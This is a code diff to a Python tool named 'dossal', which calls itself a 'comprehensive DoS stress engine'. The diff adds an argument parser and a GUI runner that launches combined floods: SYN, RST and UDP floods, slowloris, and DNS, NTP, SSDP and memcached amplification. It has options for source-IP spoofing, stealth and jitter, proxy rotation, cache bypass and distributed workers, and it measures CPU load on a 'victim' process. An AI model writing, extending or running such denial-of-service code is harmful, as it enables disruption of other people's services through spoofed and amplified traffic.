@@ -906,7 +906,7 @@ from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 from h2.exceptions import FlowControlError  # v13.1: gRPC flow control 대응
 
-VERSION = "15.10"
+VERSION = "15.11"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -4133,43 +4133,237 @@ def _generate_report(path, report, args):
 if __name__ == "__main__":
     main()
 
+def _build_arg_parser():
+    """v15.11: argparse.ArgumentParser 생성 (main()과 동일)."""
+    ap = argparse.ArgumentParser(
+        description="dossal v" + VERSION + " - comprehensive DoS stress engine",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    ap.add_argument("--mode", default="http")
+    ap.add_argument("--auto", action="store_true")
+    ap.add_argument("--combo", default=None,
+        choices=['web', 'full', 'tls', 'proto', 'amplify', 'super', 'cdn'])
+    ap.add_argument("--url", default='')
+    ap.add_argument("--targets", default=None)
+    ap.add_argument("--connections", type=int, default=100)
+    ap.add_argument("--conns", default=None)
+    ap.add_argument("--duration", type=float, default=10)
+    ap.add_argument("--payload-size", type=int, default=None)
+    ap.add_argument("--impact", action="store_true")
+    ap.add_argument("--intensity", default="balanced",
+        choices=["light", "balanced", "max"])
+    ap.add_argument("--live", action="store_true")
+    ap.add_argument("--report", default=None, metavar="FILE")
+    ap.add_argument("--threads", type=int, default=None)
+    ap.add_argument("--src-ips", default=None)
+    ap.add_argument("--spoof", type=int, default=0)
+    ap.add_argument("--stealth", action="store_true")
+    ap.add_argument("--jitter", type=float, default=0.0, metavar="MS")
+    ap.add_argument("--rotate-interval", type=float, default=5.0, metavar="SEC")
+    ap.add_argument("--recovery", action="store_true")
+    ap.add_argument("--pool", default=None, metavar="FILE")
+    ap.add_argument("--proxy", default=None, metavar="URL")
+    ap.add_argument("--proxy-file", default=None, metavar="FILE")
+    ap.add_argument("--browser", default="chrome",
+        choices=["chrome", "firefox", "safari"])
+    ap.add_argument("--cache-bypass", action="store_true")
+    ap.add_argument("--discover", action="store_true")
+    ap.add_argument("--no-auto-discover", action="store_true")
+    ap.add_argument("--adaptive", action="store_true")
+    ap.add_argument("--adaptive-target", type=float, default=200.0, metavar="MS")
+    ap.add_argument("--dist-mode", default="off",
+        choices=["off", "coordinator", "worker"])
+    ap.add_argument("--dist-port", type=int, default=9999, metavar="PORT")
+    ap.add_argument("--learn", action="store_true")
+    ap.add_argument("--recommend", action="store_true")
+    ap.add_argument("--auto-full", action="store_true")
+    ap.add_argument("--dry-run", action="store_true")
+    return ap
+
 def run_from_argv(argv):
     """GUI용: argv list로 dossal 실행 (subprocess 없이).
+    
+    v15.11: 단순화 — main() 대신 argparse + asyncio.run 직접 호출.
+    stats 객체에 직접 접근 (JSON 파싱 불필요).
     
     Returns: report_dict ({} = 실패)
     GUI는 이 함수를 백그라운드 스레드에서 호출.
     """
-    # sys.argv를 임시로 교체
-    old_argv = sys.argv[:]
-    sys.argv = [sys.argv[0]] + argv
-    
-    # StringIO로 stdout/stderr 캡처
     import io
     from contextlib import redirect_stdout, redirect_stderr
     stdout_buf = io.StringIO()
     stderr_buf = io.StringIO()
     
+    old_argv = sys.argv[:]
+    sys.argv = [sys.argv[0]] + argv
+    
     try:
         with redirect_stdout(stdout_buf), redirect_stderr(stderr_buf):
-            main()
+            # 1. argparse 직접 호출 (main() 안의 ap = argparse.ArgumentParser(...))
+            ap = _build_arg_parser()
+            args = ap.parse_args()
+            
+            # 2. main()의 전처리 로직 (url 검증, combo, auto 등)
+            if not args.url and args.targets:
+                args.url = args.targets.split(',')[0].strip()
+            if not args.url:
+                return {}
+            
+            # combo 처리
+            COMBOS = {
+                'web': 'raw,udp,syn', 'full': 'raw,udp,syn,rst',
+                'tls': 'httpsmp,h2,udp', 'proto': 'grpcmp,h2,udp',
+                'amplify': 'dns,icmp,ssdp,ntp,memcached',
+                'super': 'raw,httpsmp,h2,h3mp,grpcmp,quic,udp,tcp,syn,synack,rst,fin,websocket,wsm,slowloris,dns,icmp,ssdp,ntp,memcached',
+                'cdn': 'raw,httpsmp,h2,udp,syn',
+            }
+            if args.combo:
+                args.mode = COMBOS[args.combo]
+            
+            # auto mode
+            if args.mode == 'auto' and not args.auto:
+                args.auto = True
+                args.mode = 'http'
+            
+            if args.auto:
+                probe = auto_probe(args.url)
+                auto_modes = probe.get('recommended', ['http'])
+                port = probe.get('port', 80)
+                scheme = probe.get('scheme', 'http')
+                if scheme in ('http', 'https'):
+                    for m in ['raw', 'httpsmp', 'h2mp']:
+                        if m not in auto_modes:
+                            auto_modes.append(m)
+                for l4 in ['udp', 'syn', 'rst']:
+                    if l4 not in auto_modes:
+                        auto_modes.append(l4)
+                for amp in ['dns', 'icmp']:
+                    if amp not in auto_modes:
+                        auto_modes.append(amp)
+                auto_modes = list(dict.fromkeys(auto_modes))
+                args.mode = ','.join(auto_modes)
+                _AUTO_CONNS = {
+                    'http': 200, 'raw': 1, 'https': 50, 'httpsmp': 1, 'h2': 300, 'h2mp': 1,
+                    'grpc': 50, 'grpcmp': 1, 'udp': 1, 'quic': 1, 'syn': 1, 'rst': 1,
+                    'tcp': 1, 'wsm': 1, 'dns': 1, 'icmp': 1, 'ssdp': 1, 'ntp': 1, 'memcached': 1,
+                }
+                auto_conn_parts = [f"{m}={_AUTO_CONNS.get(m, 50)}" for m in auto_modes]
+                if args.conns:
+                    args.conns = args.conns + ',' + ','.join(auto_conn_parts)
+                else:
+                    args.conns = ','.join(auto_conn_parts)
+            
+            # mode 파싱
+            modes = list(dict.fromkeys(m.strip() for m in args.mode.split(",")))
+            
+            # learned mode
+            if 'learned' in modes:
+                learned_mode, learned_threads, learn_info = _recommend_mode(args.url)
+                if learned_mode:
+                    learned_modes = learned_mode.split('+')
+                    modes = [m for m in modes if m != 'learned'] + learned_modes
+                else:
+                    modes = [m for m in modes if m != 'learned'] + ['http']
+            
+            for m in modes:
+                if m not in WORKERS:
+                    return {}
+            
+            # Intensity
+            _INTENSITY = {"light": 10, "balanced": 50, "max": 400}
+            if args.connections == 100:
+                args.connections = _INTENSITY.get(args.intensity, 50)
+            
+            # UDP/QUIC process count
+            global _UDP_NPROCS
+            if args.threads:
+                _UDP_NPROCS[0] = max(1, min(32, args.threads))
+            else:
+                _UDP_NPROCS[0] = 4
+            
+            # Per-mode connections
+            mode_conns = {}
+            if args.conns:
+                for part in args.conns.split(','):
+                    if '=' in part:
+                        m, c = part.split('=', 1)
+                        mode_conns[m.strip()] = int(c.strip())
+            
+            # 3. Stats 생성
+            stats = Stats()
+            payload_size = args.payload_size
+            
+            # 4. asyncio.run으로 직접 실행
+            async def _run_attack():
+                sampler = None
+                baseline_cpu = 0.0
+                if args.impact:
+                    host, port = parse_ip_port(args.url)
+                    victim_pid = await _find_pid(port)
+                    if victim_pid:
+                        import psutil
+                        try:
+                            _p = psutil.Process(victim_pid)
+                            _p.cpu_percent(None)
+                            await asyncio.sleep(0.5)
+                            baseline_cpu = _p.cpu_percent(None)
+                        except Exception:
+                            baseline_cpu = 0.0
+                        sampler = CpuSampler(victim_pid)
+                        await sampler.start()
+                
+                # live stats thread
+                live_thread = None
+                _live_stop = None
+                if args.live:
+                    import threading as _lt_mod
+                    import time as _lt_mod2
+                    _live_stop = _lt_mod.Event()
+                    _live_start = _lt_mod2.time()
+                    
+                    def _live_printer_thread():
+                        last_req, last_pkt = 0, 0
+                        last_t = _lt_mod2.time()
+                        while not _live_stop.is_set():
+                            _live_stop.wait(1)
+                            if _live_stop.is_set():
+                                break
+                            now = _lt_mod2.time()
+                            dt = max(0.1, now - last_t)
+                            rps = (stats.requests - last_req) / dt
+                            pps = (stats.packets - last_pkt) / dt
+                            parts = [f"RPS={rps:,.0f}"]
+                            if stats.packets: parts.append(f"PPS={pps:,.0f}")
+                            if stats.conns: parts.append(f"CONNS={stats.conns}")
+                            parts.append(f"ERR={stats.errors}")
+                            print("  " + "  ".join(parts), flush=True)
+                            last_req, last_pkt, last_t = stats.requests, stats.packets, now
+                    
+                    live_thread = _lt_mod.Thread(target=_live_printer_thread, daemon=True)
+                    live_thread.start()
+                
+                # run 공격
+                await run(modes, args.url, args.connections, args.duration, stats, payload_size, args, mode_conns)
+                
+                # live stop
+                if live_thread and _live_stop:
+                    _live_stop.set()
+                    live_thread.join(timeout=2)
+                
+                # report
+                report = stats.report(modes, args.url, args.connections, args.duration)
+                if args.impact:
+                    report["impact"] = await impact_score(args.url, stats, args.duration, sampler, baseline_cpu)
+                return report
+            
+            report = asyncio.run(_run_attack())
+            return report if report else {}
+            
     except SystemExit:
-        # main()이 sys.exit을 호출한 경우 (dry-run, unknown mode 등)
-        pass
-    except Exception as _e:
-        import traceback as _tb
-        _tb.print_exc(file=stderr_buf)
+        return {}
+    except Exception:
+        import traceback
+        traceback.print_exc(file=stderr_buf)
+        return {}
     finally:
         sys.argv = old_argv
-    
-    # stdout에서 JSON 추출 (단행 JSON)
-    out = stdout_buf.getvalue()
-    report = {}
-    for line in out.strip().split('\n'):
-        line = line.strip()
-        if line.startswith('{'):
-            try:
-                report = json.loads(line)
-            except:
-                pass
-    
-    return report
